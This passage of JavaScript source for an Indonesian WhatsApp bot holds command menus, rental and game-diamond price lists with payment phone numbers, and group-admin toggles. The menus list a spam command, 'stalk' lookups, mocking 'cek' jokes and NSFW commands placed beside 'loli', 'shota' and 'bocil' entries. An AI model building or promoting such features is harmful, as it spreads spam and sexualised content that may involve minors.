🔱 Language 🔱 : Javascript
🎃 Platform 🎃 : Windows
✈️ Speed ✈️ : ${latensi.toFixed(4)} second
🧼 Active 🧼 : ${runtime(process.uptime())}

👤 𝐔𝐬𝐞𝐫 𝐢𝐧𝐟𝐨 👤
👥 Status 👥 : ${isOwner ? 'Owner' : 'User'}
✅ Nama User ✅ : ${pushname}
👍 Nomor User 👍 : ${sender.split('@')[0]}

❋──────────────────────❋
📸 Youtube
🐶 http://bit.ly/Janganbuka 🐶
📰 Instagram
🐱 https://instagram.com/kwokwokwo_ 🐱
📺 Tiktok
😏 https://tiktok.com/hmzzzzz 😏
📲 Facebook
😎 https://www.facebook.com/JanganBuka :v 😎
📌 Github
➡️ https://github.com/Hentongers ⬅️
❋──────────────────────❋`
but = [
          { buttonId: `${prefix}allmenu`, buttonText: { displayText: '🤖 ᴀʟʟ ᴍᴇɴᴜ 🤖' }, type: 1 },
          { buttonId: `${prefix}owner`, buttonText: { displayText: '🥫 ᴏᴡɴᴇʀ ʙᴏᴛ 🥫' }, type: 1 },
          { buttonId: `${prefix}store`, buttonText: { displayText: '🥮 sᴛᴏʀᴇ ʙᴏᴛ 🥮' }, type: 1 }
        ]
        sendButLocation(from, varr, lett, img, but) 
        sound = fs.readFileSync('./vano/bayu.mp3')
        zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: ftrol, mimetype: 'audio/mp4', ptt:true})
        break            
       
case 'setmenu':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if(args[0] == 'ori'){
menusimpel = true
reply('Sucsess')
}else if(args[0] == 'simpel'){
menusimpel = false
reply('Sucsess')
}else if (!q) {
anu =`Silahkan pilih salah satu di bawah`
 buttons = [{buttonId: `${prefix}setmenu ori`, buttonText: {displayText: '☰ ORI'}, type: 1},{buttonId: `${prefix}setmenu simpel`, buttonText: {displayText: '☰ SIMPEL'}, type: 1}]
const skuygelud = {
    contentText: `${anu}`,
    footerText: '©Created : YT ☕ NONTON HENTONGERS ☕',
    buttons: buttons,
    headerType: 1
}
await zeroyt7.sendMessage(from, skuygelud, MessageType.buttonsMessage, {quoted: ftrol})
}
break
case 'allmenu':
img = fs.readFileSync('./zeroyt7/zero.jpg')
allmenu =
`───────❒ *[ ${botname} ]* ❒───────

╭─❒ 𝗪𝗔𝗞𝗧𝗨
│ ☕ ↪️ WIB : ${wib}
│ ☕ ↪️ WITA : ${wita}
│ ☕ ↪️ WIT : ${wit}
└❏
╭─❒ 𝗧𝗢𝗗𝗔𝗬
│ ☕ ↪️ ${tampilUcapan}
│ ☕ ↪️ JAM : ${jam}
│ ☕ ↪️ HARI : ${week}
│ ☕ ↪️ WETON : ${weton}
└❏ 🌻 TANGGAL 🌻 : ${calender}

➡️ 𝒀𝑶𝑼𝑹 𝑰𝑵𝑭𝑶 ⬅️
🗿 𝗡𝗮𝗺𝗮 🗿 : *${pushname}*
👑 𝗡𝗼𝗺𝗲𝗿 👑 : *@${sender.split('@')[0]}*
📡 𝗦𝘁𝗮𝘁𝘂𝘀 📡 : *${isOwner ? 'Owner' : 'User'}*`
allmen =`${readmore}

🤖🤖🤖🤖🤖 𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}wangy
↪️ ${prefix}beban
↪️ ${prefix}add
↪️ ${prefix}kick
↪️ ${prefix}setpp
↪️ ${prefix}nsfw
↪️ ${prefix}ganteng
↪️ ${prefix}antilink
↪️ ${prefix}group
↪️ ${prefix}linkgrup
↪️ ${prefix}welcome
↪️ ${prefix}antivirtex
↪️ ${prefix}promote
↪️ ${prefix}resetlinkgc
↪️ ${prefix}demote
↪️ ${prefix}ngentod
↪️ ${prefix}setdesc
↪️ ${prefix}setname 
↪️ ${prefix}hidetag
↪️ ${prefix}hidetag2
↪️ ${prefix}tagall
↪️ ${prefix}tagall2
↪️ ${prefix}listadmin

🤖🤖🤖🤖🤖 𝐒𝐭𝐢𝐜𝐤𝐞𝐫 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}attp
↪️ ${prefix}attp2
↪️ ${prefix}attp3
↪️ ${prefix}ttp
↪️ ${prefix}ttp2
↪️ ${prefix}ttp3
↪️ ${prefix}toimg
↪️ ${prefix}sticker
↪️ ${prefix}patrik
↪️ ${prefix}anjay
↪️ ${prefix}amongus
↪️ ${prefix}tomp3
↪️ ${prefix}tovideo

🤖🤖🤖🤖🤖 𝐑𝐚𝐧𝐝𝐨𝐦 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}owner
↪️ ${prefix}sewabot
↪️ ${prefix}report
↪️ ${prefix}runtime
↪️ ${prefix}speed 
↪️ ${prefix}sc
↪️ ${prefix}rulesbot
↪️ ${prefix}sharelock

🤖🤖🤖🤖🤖 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}bc
↪️ ${prefix}spam
↪️ ${prefix}setppwa
↪️ ${prefix}chat 62
↪️ ${prefix}block @tag
↪️ ${prefix}unblock @tag
↪️ ${prefix}delete chat
↪️ ${prefix}setbio
↪️ ${prefix}leave

🤖🤖🤖🤖🤖 𝐌𝐚𝐠𝐞𝐫 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}nulis
↪️ ${prefix}nuliskanan
↪️ ${prefix}nuliskiri
↪️ ${prefix}foliokanan
↪️ ${prefix}foliokiri

🤖🤖🤖🤖🤖 𝐈𝐦𝐚𝐠𝐞 𝐌𝐚𝐤𝐞𝐫 🤖🤖🤖🤖🤖
↪️ ${prefix}pubg
↪️ ${prefix}toxic
↪️ ${prefix}bokeh
↪️ ${prefix}box3d
↪️ ${prefix}luxury
↪️ ${prefix}cloud
↪️ ${prefix}minion
↪️ ${prefix}icecold
↪️ ${prefix}pornhub
↪️ ${prefix}phkomen
↪️ ${prefix}ytkomen
↪️ ${prefix}freefire
↪️ ${prefix}freefire2
↪️ ${prefix}teks1917
↪️ ${prefix}metaldark
↪️ ${prefix}breakwall
↪️ ${prefix}harrypotter
↪️ ${prefix}blackpink
↪️ ${prefix}fakedonald
↪️ ${prefix}greenneon
↪️ ${prefix}advanceglow
↪️ ${prefix}futureneon
↪️ ${prefix}sandwriting
↪️ ${prefix}sandsummer
↪️ ${prefix}sandengraved
↪️ ${prefix}neonlight
↪️ ${prefix}holographic
↪️ ${prefix}duluxesilver
↪️ ${prefix}newyearcard
↪️ ${prefix}bloodfrosted
↪️ ${prefix}halloween
↪️ ${prefix}jokerlogo
↪️ ${prefix}fireworksparkple
↪️ ${prefix}natureleaves
↪️ ${prefix}strawberry
↪️ ${prefix}roadwarning
↪️ ${prefix}summersand
↪️ ${prefix}horrorblood
↪️ ${prefix}thunder

🤖🤖🤖🤖🤖 𝐈𝐦𝐚𝐠𝐞 𝐌𝐚𝐤𝐞𝐫𝟐 🤖🤖🤖🤖🤖
↪️ ${prefix}tahta
↪️ ${prefix}glitch 
↪️ ${prefix}cslogo
↪️ ${prefix}tfire
↪️ ${prefix}space
↪️ ${prefix}traggold
↪️ ${prefix}avenger
↪️ ${prefix}steel3d
↪️ ${prefix}ninjalogo
↪️ ${prefix}lionlogo
↪️ ${prefix}banerlol 
↪️ ${prefix}banerlol2
↪️ ${prefix}text8bit           
↪️ ${prefix}lightsok
↪️ ${prefix}marvelstudio
↪️ ${prefix}coolgravity
↪️ ${prefix}wallgravity
↪️ ${prefix}grafityname
↪️ ${prefix}wolflogo
↪️ ${prefix}watercolor
↪️ ${prefix}silverplaybutton
↪️ ${prefix}goldplaybutton

🤖🤖🤖🤖🤖 𝐈𝐬𝐥𝐚𝐦𝐢 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}listsurah
↪️ ${prefix}asmaulhusna
↪️ ${prefix}jadwalsholat
↪️ ${prefix}kisahnabi
↪️ ${prefix}alquran
↪️ ${prefix}alquranaudio

🤖🤖🤖🤖🤖 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}tiktokmusic
↪️ ${prefix}ytsearch
↪️ ${prefix}play
↪️ ${prefix}ytmp3
↪️ ${prefix}ytmp4
↪️ ${prefix}igdl
↪️ ${prefix}fbdl
↪️ ${prefix}brainly
↪️ ${prefix}lirik
↪️ ${prefix}tiktoknowm
↪️ ${prefix}pinterest
↪️ ${prefix}spotifysearch

🤖🤖🤖🤖🤖 𝐆𝐚𝐛𝐮𝐭 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}suit
↪️ ${prefix}jodoh
↪️ ${prefix}artinama
↪️ ${prefix}ngentod
↪️ ${prefix}tebakumur
↪️ ${prefix}weton
↪️ ${prefix}jadian
↪️ ${prefix}faktaunik
↪️ ${prefix}anime
↪️ ${prefix}truth
↪️ ${prefix}dare
↪️ ${prefix}kapan
↪️ ${prefix}dadu
↪️ ${prefix}tembak udara 
↪️ ${prefix}tembak laut
↪️ ${prefix}tembak darat
↪️ ${prefix}family100
↪️ ${prefix}slot
↪️ ${prefix}cekmati
↪️ ${prefix}semoji
↪️ ${prefix}quotes
↪️ ${prefix}quotesanime
↪️ ${prefix}quotesdilan
↪️ ${prefix}quotesimage
↪️ ${prefix}katabijak
↪️ ${prefix}randomnama
↪️ ${prefix}meme
↪️ ${prefix}darkjoke
↪️ ${prefix}memeindo

🤖🤖🤖🤖🤖 𝐌𝐞𝐧𝐮 𝐂𝐞𝐤 🤖🤖🤖🤖🤖
↪️${prefix}cek gajelas
↪️${prefix}cek males
↪️${prefix}cek pelit
↪️${prefix}cek baik
↪️${prefix}cek arogan
↪️${prefix}cek mandul
↪️${prefix}cek galak
↪️${prefix}cek sabar
↪️${prefix}cek lebus
↪️${prefix}cek ikhlas 
↪️${prefix}cek lucu 
↪️${prefix}cek goblok 
↪️${prefix}cek gila 
↪️${prefix}cek tolol 
↪️${prefix}cek ganteng 
↪️${prefix}cek cantik 
↪️${prefix}cek manis 
↪️${prefix}cek jelek
↪️${prefix}cek cupu 
↪️${prefix}cek skill 
↪️${prefix}cek gay 
↪️${prefix}cek cupu 
↪️${prefix}cek lesbi 
↪️${prefix}cek nafsu
↪️${prefix}cek sange 
↪️${prefix}cek alay 
↪️${prefix}cek banci 
↪️${prefix}cek tomboi 
↪️${prefix}cek peka 

🤖🤖🤖🤖🤖 𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}kbbi
↪️ ${prefix}jarak
↪️ ${prefix}translate
↪️ ${prefix}infogempa
↪️ ${prefix}covidindo
↪️ ${prefix}covidglobal
↪️ ${prefix}wikipedia
↪️ ${prefix}playstore
↪️ ${prefix}kodepos
↪️ ${prefix}newsinfo
↪️ ${prefix}jadwaltv
↪️ ${prefix}cuaca
↪️ ${prefix}gimage
↪️ ${prefix}wallpapersearch
↪️ ${prefix}shopee
↪️ ${prefix}google

🤖🤖🤖🤖🤖 𝐒𝐭𝐚𝐥𝐤 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}igstalk
↪️ ${prefix}mlstalk
↪️ ${prefix}tkstalk
↪️ ${prefix}githubstalk
↪️ ${prefix}shortlink

🤖🤖🤖🤖🤖 𝐀𝐬𝐮𝐩𝐚𝐧 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}asupan
↪️ ${prefix}asupancecan
↪️ ${prefix}asupanhijaber
↪️ ${prefix}asupansantuy
↪️ ${prefix}asupanukhti
↪️ ${prefix}asupanbocil
↪️ ${prefix}asupanghea
↪️ ${prefix}asupanrika

🤖🤖🤖🤖🤖 𝐍𝐬𝐟𝐰 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}yuri
↪️ ${prefix}hentai
↪️ ${prefix}anal
↪️ ${prefix}lesbian
↪️ ${prefix}eroneko
↪️ ${prefix}bj
↪️ ${prefix}kitsune
↪️ ${prefix}pussy
↪️ ${prefix}wallpaper
↪️ ${prefix}neko2
↪️ ${prefix}baka
↪️ ${prefix}slap
↪️ ${prefix}poke
↪️ ${prefix}keta
↪️ ${prefix}awoo
↪️ ${prefix}blowjob
↪️ ${prefix}megumin
↪️ ${prefix}neko
↪️ ${prefix}trapnime
↪️ ${prefix}chiisaihentai          
↪️ ${prefix}ahegao
↪️ ${prefix}hololewd
↪️ ${prefix}ahegao
↪️ ${prefix}sideoppai
↪️ ${prefix}animefeets
↪️ ${prefix}animebooty
↪️ ${prefix}animethighss
↪️ ${prefix}hentaiparadise
↪️ ${prefix}animearmpits
↪️ ${prefix}hentaifemdom
↪️ ${prefix}lewdanimegirls
↪️ ${prefix}biganimetiddies
↪️ ${prefix}animebellybutton
↪️ ${prefix}glasses

🤖🤖🤖🤖🤖 𝐖𝐢𝐛𝐮 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}art    
↪️ ${prefix}exo
↪️ ${prefix}elf
↪️ ${prefix}loli
↪️ ${prefix}waifu
↪️ ${prefix}shota
↪️ ${prefix}husbu
↪️ ${prefix}sagiri
↪️ ${prefix}shinobu
↪️ ${prefix}megumin
↪️ ${prefix}wallnime

🤔 𝐒𝐭𝐫𝐞𝐬 𝐌𝐞??𝐮 🤔
↪️ ${prefix}bokep
COMING SON~

🤖🤖🤖🤖🤖 𝐀𝐧𝐢𝐦𝐞 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}gon
↪️ ${prefix}naruto
↪️ ${prefix}kaneki
↪️ ${prefix}mikey
↪️ ${prefix}kurama
↪️ ${prefix}rimuru
↪️ ${prefix}akira
↪️ ${prefix}dazai
↪️ ${prefix}miku
↪️ ${prefix}mikasa
↪️ ${prefix}eren
↪️ ${prefix}titan
↪️ ${prefix}levi
↪️ ${prefix}sakura
↪️ ${prefix}hinata
↪️ ${prefix}neji
↪️ ${prefix}shinobu
↪️ ${prefix}kurumi
↪️ ${prefix}animerem
↪️ ${prefix}minato
↪️ ${prefix}jiraya
↪️ ${prefix}tsunade
↪️ ${prefix}kiba
↪️ ${prefix}boruto
↪️ ${prefix}sarada
↪️ ${prefix}sasuke
↪️ ${prefix}madara
↪️ ${prefix}obito
↪️ ${prefix}tanjiro
↪️ ${prefix}nezuko
↪️ ${prefix}luffy
↪️ ${prefix}zoro
↪️ ${prefix}sanji
↪️ ${prefix}killua
↪️ ${prefix}natsu
↪️ ${prefix}genos
↪️ ${prefix}saitama
↪️ ${prefix}miku

🤖🤖🤖🤖🤖 𝐔𝐩𝐬𝐰 𝐌𝐞𝐧𝐮 🤖🤖🤖🤖🤖
↪️ ${prefix}upswteks
↪️ ${prefix}upswsticker
↪️ ${prefix}upswaudio
↪️ ${prefix}upswvideo
↪️ ${prefix}upswlokasi
↪️ ${prefix}upswimage

© Hentongers :v
JANGAN LUPA SUBREK YT ME : 
*☕ NONTON HENTONGERS ☕*`
but = [
          { buttonId: `${prefix}rulesbot`, buttonText: { displayText: '🗂️ RULES BOT 🗂️' }, type: 1 }
        ]
sendButLocation(from, allmenu, allmen, img, but, { thumbnail: Buffer.alloc(0) })
sound = fs.readFileSync('./vano/asu.mp3')
                    zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break

case 'infobot': 
var _0x553a73=_0xcb99;function _0x21a8(){var _0x21e150=['length','\x0a*┃┃*\x20Nama\x20Bot\x20:\x20','3900192rYYOMT','uptime','©Created\x20:\x20YT MBP\x20_17','1385268sGZYbD','┏━➤\x20*INFO\x20BOT*\x20\x0a*┃┃*\x20Creator\x20Bot\x20:\x20YT MBP\x20_17\x0a*┃┃*\x20Nama\x20Owner\x20:\x20','toFixed','owner','61trxzgD','88WaaQEL','18026LfTEkk','24TEJUfw','\x0a*┃┃*\x20Prefix\x20:\x20Multi\x20Prefix\x0a*┃┃*\x20Total\x20Pengguna\x20:\x20','36VQYfQo','☰\x20SCRIPT','146385WnHMsj','315930uoBJpo','716991fxZrtE','412353aDMRHU','7YDPsZi'];_0x21a8=function(){return _0x21e150;};return _0x21a8();}function _0xcb99(_0x1aedf2,_0xc89308){var _0x21a816=_0x21a8();return _0xcb99=function(_0xcb9971,_0x5d5553){_0xcb9971=_0xcb9971-0x1ae;var _0x56f03c=_0x21a816[_0xcb9971];return _0x56f03c;},_0xcb99(_0x1aedf2,_0xc89308);}(function(_0x5ddc5e,_0x3a93ea){var _0x4dbf32=_0xcb99,_0x1a5829=_0x5ddc5e();while(!![]){try{var _0x2e82b7=-parseInt(_0x4dbf32(0x1b9))/0x1*(parseInt(_0x4dbf32(0x1bb))/0x2)+parseInt(_0x4dbf32(0x1b5))/0x3+-parseInt(_0x4dbf32(0x1bc))/0x4*(-parseInt(_0x4dbf32(0x1c0))/0x5)+-parseInt(_0x4dbf32(0x1b2))/0x6*(-parseInt(_0x4dbf32(0x1af))/0x7)+-parseInt(_0x4dbf32(0x1ba))/0x8*(parseInt(_0x4dbf32(0x1ae))/0x9)+-parseInt(_0x4dbf32(0x1c1))/0xa+parseInt(_0x4dbf32(0x1c2))/0xb*(parseInt(_0x4dbf32(0x1be))/0xc);if(_0x2e82b7===_0x3a93ea)break;else _0x1a5829['push'](_0x1a5829['shift']());}catch(_0x4fb0cc){_0x1a5829['push'](_0x1a5829['shift']());}}}(_0x21a8,0x61134),timestamp=speed(),latensi=speed()-timestamp,teks=_0x553a73(0x1b6)+ownername+_0x553a73(0x1b1)+botname+_0x553a73(0x1bd)+pendaftar[_0x553a73(0x1b0)]+'\x0a*┃┃*\x20Runtime\x20:\x20'+runtime(process[_0x553a73(0x1b3)]())+'\x0a*┃┃*\x20Speed\x20:\x20'+latensi[_0x553a73(0x1b7)](0x4)+'\x20second\x0a*┃┃*\x20Language\x20:\x20Javascript\x20&\x20Nodejs\x0a*┃┗━━━━━━━━*\x0a*┃◗\x20Thanks\x20To\x20Allah\x20S.W.T*\x0a*┃◗\x20Thank\x20To\x20Ortu*\x0a*┃◗\x20Thank\x20To\x20YT MBP\x20_17\x20(Creator)*\x0a*┃◗\x20Thanks\x20To\x20All\x20Subscriberku*\x0a*┗━━━━━━━\x20•*',but=[{'buttonId':prefix+_0x553a73(0x1b8),'buttonText':{'displayText':'☰\x20OWNER'},'type':0x1},{'buttonId':prefix+'sc','buttonText':{'displayText':_0x553a73(0x1bf)},'type':0x1}],sendButton(from,teks,_0x553a73(0x1b4),but,mek));
break
case 'sewabot':
image = fs.readFileSync('./zeroyt7/zerothumb.jpg')
sewa = 
`Hay ${pushname}, ${tampilUcapan}
Mau Sewa Bot Ya ? 

Silahkan Pilih List Di Bawah Ini`
but = [
          { buttonId: `${prefix}sebulan`, buttonText: { displayText: '☰ 1 BULAN' }, type: 1 },
          { buttonId: `${prefix}permanen`, buttonText: { displayText: '☰ PERMANEN' }, type: 1 }
        ]
        sendButLocation(from, sewa, faketeks, image, but, { thumbnail: Buffer.alloc(0) })
break
case 'sebulan':
image = fs.readFileSync('./zeroyt7/zerothumb.jpg')
sebulan =
`Untuk Harga Sewa Bot 
Sebulan 10.000 .

Silahkan Pilih Metode Pembayarannya Dibawah Ini`
but = [
          { buttonId: `${prefix}gopay`, buttonText: { displayText: '🍵 GOPAY 🍵' }, type: 1 },
          { buttonId: `${prefix}dana`, buttonText: { displayText: '🍰 DANA 🍰' }, type: 1 },
          { buttonId: `${prefix}ovo`, buttonText: { displayText: '🍭 OVO 🍭' }, type: 1 }
        ]
        sendButLocation(from, sebulan, faketeks, image, but, { thumbnail: Buffer.alloc(0) })
break
case 'permanen':
image = fs.readFileSync('./zeroyt7/zerothumb.jpg')
permanen =
`Untuk Harga Sewa Bot 
Permanen 15.000

Silahkan Pilih Metode Pembayarannya Dibawah Ini`
but = [
          { buttonId: `${prefix}gopay`, buttonText: { displayText: '🍵 GOPAY 🍵' }, type: 1 },
          { buttonId: `${prefix}dana`, buttonText: { displayText: '🍰 DANA 🍰' }, type: 1 },
          { buttonId: `${prefix}ovo`, buttonText: { displayText: '🍭 OVO 🍭' }, type: 1 }
        ]
        sendButLocation(from, permanen, faketeks, image, but, { thumbnail: Buffer.alloc(0) })
break
case 'gopay':
gopay =
`No Gopay : 085709898902
A/N : B***R***`
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: '👍 SELESAI 👍' }, type: 1 }
]
sendButton(from, gopay, faketeks, but, mek)
break
case 'dana':
dana =
`No Dana : 08179813148
A/N : E****`
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: '👍 SELESAI 👍' }, type: 1 }
]
sendButton(from, dana, faketeks, but, mek)
break
case 'ovo':
ovo =
`No Ovo : 085894327468
A/N : P****`
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: '👍 SELESAI 👍' }, type: 1 }
]
sendButton(from, ovo, faketeks, but, mek)
break
case 'store':
image = fs.readFileSync('./zeroyt7/zerothumb.jpg')
store = 
`Hay ${pushname}, ${tampilUcapan}
Ada Yg Kepo Nich ><

Silahkan Pilih List Di Bawah Ini`
but = [
          { buttonId: `${prefix}dmepep`, buttonText: { displayText: '🌻 DM FF 🌻' }, type: 1 }, 
          { buttonId: `${prefix}dmml`, buttonText: { displayText: '🌼 DM ML 🌼' }, type: 1 }, 
          { buttonId: `${prefix}mbayu`, buttonText: { displayText: '😁 KEPERLUAN BOT 😁' }, type: 1 }
        ]
        sendButLocation(from, store, faketeks, image, but, { thumbnail: Buffer.alloc(0) })
break
case 'dmml':
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: '👤 OWNER 👤' }, type: 1 },
{ buttonId: `${prefix}bayar`, buttonText: { displayText: '💵 PEMBAYARAN 💵' }, type: 1 }
]
sendButton(from, "*MOBILE LEGEND FAST A VIA ID & SERVER PROSES 1 - 10 MENIT MAX 24 JAM JIKA EROR* \n*LIST HARGA DM ML* \n```💎 86   = Rp  18,890```\n```💎 172  = Rp  38,400```\n```💎 257  = Rp  57,500```\n```💎 344  = Rp  75,400```\n```💎 429  = Rp  95,000```\n```💎 514  = Rp 113,400```\n```💎 600  = Rp 132,000```\n```💎 706  = Rp 152,000```\n```💎 878  = Rp 186,500```\n```💎 963  = Rp 207,000```\n```💎 1050 = Rp 226,000```\n```💎 1412 = Rp 300,000``` ", faketeks, but, mek)
break
case 'dmepep':
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: '👤 OWNER 👤' }, type: 1 },
{ buttonId: `${prefix}bayar`, buttonText: { displayText: '💵 PEMBAYARAN 💵' }, type: 1 }
]
sendButton(from, "*LIST HARGA DM FF*\n5       💎   :875\n20     💎   :2.745\n50     💎   :6.721\n70     💎   : 9.320\n100   💎   : 14.250\n140   💎   : 18.350\n210   💎   : 27.400\n355   💎   : 46.200\n500   💎   : 66.200\n720   💎   : 91.200\n1440 💎   : 180.500\n2000 💎   : 246.000\n*KESALAHAN MENGISI ID BUKAN BUKAN TANGGUNG JAWAB KAMI*", faketeks, but, mek)
break
case 'mbayu':
img = fs.readFileSync('./zeroyt7/zerothumb.jpg')
store =
`🗿 𝗡𝗜𝗚𝗛𝗧 𝗕𝗢𝗧 🗿`
storee =
`𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 𝗥𝗗𝗣
↪️ RAM 2GB 1vCPU = 25.000
↪️ RAM 4GB 2vCPU = 45.000
↪️ RAM 8GB 4vCPU = 95.000

𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 𝗩𝗣𝗦
↪️ RAM 1GB 1vCPU = 15.000
↪️ RAM 2GB 1vCPU = 25.000
↪️ RAM 4GB 2vCPU = 50.000
↪️ RAM 8GB 4vCPU = 100.000

𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 𝗦𝗖 𝗕𝗢𝗧
↪️ SC BIASA = 35.000
↪️ SC KATALOG = 50.000
↪️ SC PDF , ZIP = 70.000`
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: '☰ CHAT OWNER' }, type: 1 }
]
sendButLocation(from, store, storee, img, but, { thumbnail: Buffer.alloc(0) })
break
case 'bayar':
image = fs.readFileSync('./zeroyt7/zerothumb.jpg')
bayar =
`Hi ${pushname}, ${tampilUcapan}

Silahkan Pilih Metode Pembayarannya Dibawah Ini`
but = [
          { buttonId: `${prefix}gopay`, buttonText: { displayText: '🍵 GOPAY 🍵' }, type: 1 },
          { buttonId: `${prefix}dana`, buttonText: { displayText: '🍰 DANA 🍰' }, type: 1 },
          { buttonId: `${prefix}ovo`, buttonText: { displayText: '🍭 OVO 🍭' }, type: 1 }
        ]
        sendButLocation(from, bayar, faketeks, image, but, { thumbnail: Buffer.alloc(0) })
break
	case 'bts':
	reply(`Banyak Di Pasar ngab`) 
	break
	
//━━━━━━━━━━━━━━━[ FITUR GROUP ]━━━━━━━━━━━━━━━━━//

case 'welcome':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
but = [
{ buttonId: '!welcomeon', buttonText: { displayText: '✅ AKTIFKAN ✅' }, type: 1 },
{ buttonId: '!welcomeoff', buttonText: { displayText: '❌ MATIKAN ❌' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk welcome group", faketeks, but, mek)
break
case 'welcomeon':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
if (isWelkom) return reply('👽 WELCOME SUDAH AKTIF KAK 👽')
_welkom.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`✅ BERHASIL MENGAKTIFKAN FITUR WELCOME DI GROUP ✅\`\`\` *${groupMetadata.subject}*`)
break
case 'welcomeoff':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
if (!isWelkom) return reply('😎 WELCOME SUDAH NONAKTIF SEBELUMNYA KAK 😎')
_welkom.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`✅ BERHASIL MENONAKTIFKAN FITUR WECOME DI GROUP ✅\`\`\` *${groupMetadata.subject}*`)
break
case 'antilink' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
but = [
{ buttonId: '!antilinkon', buttonText: { displayText: '✅ AKTIFKAN ✅' }, type: 1 },
{ buttonId: '!antilinkoff', buttonText: { displayText: '❌ MATIKAN ❌' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk antilink group", faketeks, but, mek)
break
case 'antilinkon' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
if (isAntiLink) return reply('anti link sudah on')
_antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`✓Sukses mengaktifkan fitur anti link di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antilinkoff' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
if (!isAntiLink) return reply('anti link sudah off sebelumnya')
_antilink.splice(from, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`✓Sukses menonaktifkan fitur anti link di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antivirtex' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
but = [
{ buttonId: '!antivirtexon', buttonText: { displayText: '✅ AKTIFKAN ✅' }, type: 1 },
{ buttonId: '!antivirtexoff', buttonText: { displayText: '❌ MATIKAN ❌' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk antivirtex group", faketeks, but, mek)
break
case 'antivirtexon' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
if (isAntiVirtex) return reply('anti virtex group sudah aktif sebelumnya')
_antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`Sukses mengaktifkan mode anti virtex di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antivirtexoff' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
if (!isAntiVirtex) return reply('Mode anti virtex sudah nonaktif sebelumnya')
_antivirtex.splice(from, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`✓Sukes menonaktifkan mode anti virtex di group\`\`\` *${groupMetadata.subject}*`)
break
case 'group' :
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply("🗿 BOT BUKAN ADMIN 🗿")
but = [
{ buttonId: '!groupbuka', buttonText: { displayText: '☰ BUKA' }, type: 1 },
{ buttonId: '!geouptutup', buttonText: { displayText: '☰ TUTUP' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk buka/tutup group", faketeks, but, mek)
break
case 'groupbuka' :
